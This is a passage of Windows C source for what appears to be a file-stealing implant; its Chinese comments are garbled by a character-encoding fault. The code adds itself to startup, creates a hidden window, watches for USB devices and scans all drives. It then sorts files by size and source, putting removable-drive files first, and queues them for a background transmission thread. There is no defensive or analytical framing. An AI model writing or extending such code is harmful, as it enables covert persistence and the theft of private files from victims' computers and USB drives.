    // ��ʼ�����к��ļ��б�
    InitQueue();
    g_state.fileList = (FileInfo*)malloc(100 * sizeof(FileInfo));
    if (!g_state.fileList) {
        printf("[ERROR] �ļ��б��ڴ����ʧ�ܣ�\n");
        return;
    }
    g_state.fileListCapacity = 100;

    // ����ɨ��������
    ScanAllDrives();
    printf("[INFO] ��Դ������ɣ����³�ʼ��״̬\n");

    // =================���������߳� =================
    // ����ԭ�ӱ�־
    InterlockedExchange(&g_state.threadExitFlag, FALSE);
    g_state.hThread = CreateThread(NULL, 0, TransmissionThread, NULL, 0, &g_state.threadId);
    if (!g_state.hThread) {
        MessageBox(NULL, "�����߳�����ʧ��", "����", MB_ICONERROR);
    }
}
void InitMessageWindow() {
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = WndProc; // ���ڹ��̺���
    wc.hInstance = GetModuleHandle(NULL); // ��ǰʵ�����
    wc.lpszClassName = "ZafkielMsgWindow"; // ��������

    // ע�ᴰ����
    if (!RegisterClassA(&wc)) {
        MessageBox(NULL, "������ע��ʧ��", "����", MB_ICONERROR);
        return;
    }

    // �������ش���
    g_state.hwnd = CreateWindowExA(
            WS_EX_TOOLWINDOW,              // ��չ��ʽ�����ߴ��ڣ�������������ʾ��
            "ZafkielMsgWindow",            // ��������
            "Hidden Window",               // ���ڱ���
            0,                             // ������ʽ���ޱ߿�
            0, 0, 0, 0,                    // ����λ�úʹ�С��ȫ��Ϊ 0�����ش��ڣ�
            NULL,                          // �����ھ��
            NULL,                          // �˵����
            GetModuleHandle(NULL),         // ʵ�����
            NULL                           // ��������
    );

    if (!g_state.hwnd) {
        MessageBox(NULL, "���ڴ���ʧ��", "����", MB_ICONERROR);
    }
}

// ======================== ������ ========================
int WINAPI WinMain(
        HINSTANCE hInstance,      // ��ǰʵ�����
        HINSTANCE hPrevInstance,  // ǰһ��ʵ�������ͨ��Ϊ NULL��
        LPSTR     lpCmdLine,      // �����в���
        int       nShowCmd        // ������ʾ��ʽ
) {
    // ��ʼ��Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        MessageBox(NULL, "Winsock ��ʼ��ʧ��", "����", MB_ICONERROR);
        return 1;
    }

    // ע�Ὺ��������
    AddToStartup();

    // ��ʼ�����ں��豸֪ͨ
    InitMessageWindow();
    RegisterDeviceNotify();
    InitializeCriticalSection(&g_state.cs);
    InitQueue();

    // ��ʼ���ļ��б�
    g_state.fileListCapacity = 100;
    g_state.fileList = (FileInfo*)malloc(g_state.fileListCapacity * sizeof(FileInfo));
    if (!g_state.fileList) {
        MessageBox(NULL, "�ļ��б��ڴ����ʧ��", "����", MB_ICONERROR);
        WSACleanup();
        return 1;
    }
    g_state.fileCount = 0;

    // ========== ��ʽ��ʼ���߳��˳���־ ==========
    g_state.threadExitFlag = FALSE;  // ��ʼ��Ϊδ�˳�

    // ���ͳ�ʼ������ʾ
    SendInitialNotification();

    // ��ʼɨ��������
    printf("[INFO] ����ִ�г�ʼɨ��...\n");
    ScanAllDrives();

    // ======================== �ļ������Ż��߼� ========================
    const unsigned long long SIZE_6KB = 6 * 1024;
    const unsigned long long SIZE_10KB = 10 * 1024;

    // ��һ�α�����ͳ�Ƹ������ļ�����
    int usbLCount = 0, usbMCount = 0, otherLCount = 0, otherMCount = 0, allSCount = 0;
    for (int i = 0; i < g_state.fileCount; i++) {
        unsigned long long size = g_state.fileList[i].size;

        // ����С��6KB���ļ�
        if (size < SIZE_6KB) {
            continue;
        }

        if (size >= SIZE_6KB && size <= SIZE_10KB) {
            allSCount++;
            continue;
        }
        if (g_state.fileList[i].isFromRemovable) {
            if (size > SIZE_30MB) usbLCount++;
            else if (size > SIZE_10KB) usbMCount++;
        } else {
            if (size > SIZE_30MB) otherLCount++;
            else if (size > SIZE_10KB) otherMCount++;
        }
    }

    // ��̬����������飨������ʧ�ܣ�
    FileInfo* usbLarge = NULL;
    FileInfo* usbMedium = NULL;
    FileInfo* otherLarge = NULL;
    FileInfo* otherMedium = NULL;
    FileInfo* allSmall = NULL;

    // USB���ļ�����
    if (usbLCount > 0) {
        usbLarge = malloc(usbLCount * sizeof(FileInfo));
        if (!usbLarge) {
            printf("[WARN] USB���ļ������ڴ����ʧ�ܣ������÷���\n");
            usbLCount = 0;
        }
    }

    // USB���ļ�����
    if (usbMCount > 0) {
        usbMedium = malloc(usbMCount * sizeof(FileInfo));
        if (!usbMedium) {
            printf("[WARN] USB���ļ������ڴ����ʧ�ܣ������÷���\n");
            usbMCount = 0;
        }
    }

    // �������ļ�����
    if (otherLCount > 0) {
        otherLarge = malloc(otherLCount * sizeof(FileInfo));
        if (!otherLarge) {
            printf("[WARN] �������ļ������ڴ����ʧ�ܣ������÷���\n");
            otherLCount = 0;
        }
    }

    // �������ļ�����
    if (otherMCount > 0) {
        otherMedium = malloc(otherMCount * sizeof(FileInfo));
        if (!otherMedium) {
            printf("[WARN] �������ļ������ڴ����ʧ�ܣ������÷���\n");
            otherMCount = 0;
        }
    }

    // С�ļ�����
    if (allSCount > 0) {
        allSmall = malloc(allSCount * sizeof(FileInfo));
        if (!allSmall) {
            printf("[WARN] С�ļ������ڴ����ʧ�ܣ������÷���\n");
            allSCount = 0;
        }
    }

// �ڶ��α���������������
    usbLCount = usbMCount = otherLCount = otherMCount = allSCount = 0;
    for (int i = 0; i < g_state.fileCount; i++) {
        FileInfo current = g_state.fileList[i];
        unsigned long long size = current.size;

        // ����������С��6KB���ļ�
        if (size < SIZE_6KB) {
            continue;
        }

        if (size >= SIZE_6KB && size <= SIZE_10KB) {
            if (allSmall) allSmall[allSCount++] = current;
            continue;
        }

        if (current.isFromRemovable) {
            if (size > SIZE_30MB) {
                if (usbLarge) usbLarge[usbLCount++] = current;
            } else if (size > SIZE_10KB) {
                if (usbMedium) usbMedium[usbMCount++] = current;
            }
        } else {
            if (size > SIZE_30MB) {
                if (otherLarge) otherLarge[otherLCount++] = current;
            } else if (size > SIZE_10KB) {
                if (otherMedium) otherMedium[otherMCount++] = current;
            }
        }
    }

    // ======================== �����ȼ���ӣ�������ɹ�����ķ��ࣩ ========================
    if (usbLarge && usbLCount > 0) {
        for (int i = 0; i < usbLCount; i++) {
            EnqueueTask((TransmissionTask){.active = TRUE, .info = usbLarge[i], .retryCount = 0});
        }
    }
    if (usbMedium && usbMCount > 0) {
        for (int i = 0; i < usbMCount; i++) {
            EnqueueTask((TransmissionTask){.active = TRUE, .info = usbMedium[i], .retryCount = 0});
        }
    }
    if (otherLarge && otherLCount > 0) {
        for (int i = 0; i < otherLCount; i++) {
            EnqueueTask((TransmissionTask){.active = TRUE, .info = otherLarge[i], .retryCount = 0});
        }
    }
    if (otherMedium && otherMCount > 0) {
        for (int i = 0; i < otherMCount; i++) {
            EnqueueTask((TransmissionTask){.active = TRUE, .info = otherMedium[i], .retryCount = 0});
        }
    }
    if (allSmall && allSCount > 0) {
        for (int i = 0; i < allSCount; i++) {
            EnqueueTask((TransmissionTask){.active = TRUE, .info = allSmall[i], .retryCount = 0});
        }
    }

    // �ͷ���ʱ�������飨free(NULL)�ǰ�ȫ�ģ�
    free(usbLarge);
    free(usbMedium);
    free(otherLarge);
    free(otherMedium);
    free(allSmall);

    // ���������߳�
    g_state.hThread = CreateThread(NULL, 0, TransmissionThread, NULL, 0, &g_state.threadId);
    if (g_state.hThread == NULL) {
        MessageBox(NULL, "�����̴߳���ʧ��", "����", MB_ICONERROR);
        free(g_state.fileList);
        WSACleanup();
        return 1;
    }

    // ��Ϣѭ��
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        // ���������־
        EnterCriticalSection(&g_state.cs);
        if (g_state.needRestart) {
            g_state.needRestart = FALSE;
            LeaveCriticalSection(&g_state.cs);

            SafeRestart(); // ִ�а�ȫ����
        } else {
            LeaveCriticalSection(&g_state.cs);
        }
    }


    // ������Դ
    UnregisterDeviceNotification(g_state.hDeviceNotify);
    DeleteCriticalSection(&g_state.cs);
    CloseHandle(g_state.hThread);
    free(g_state.fileList);
    free(g_state.taskQueue.tasks);
    WSACleanup();

    return 0;
}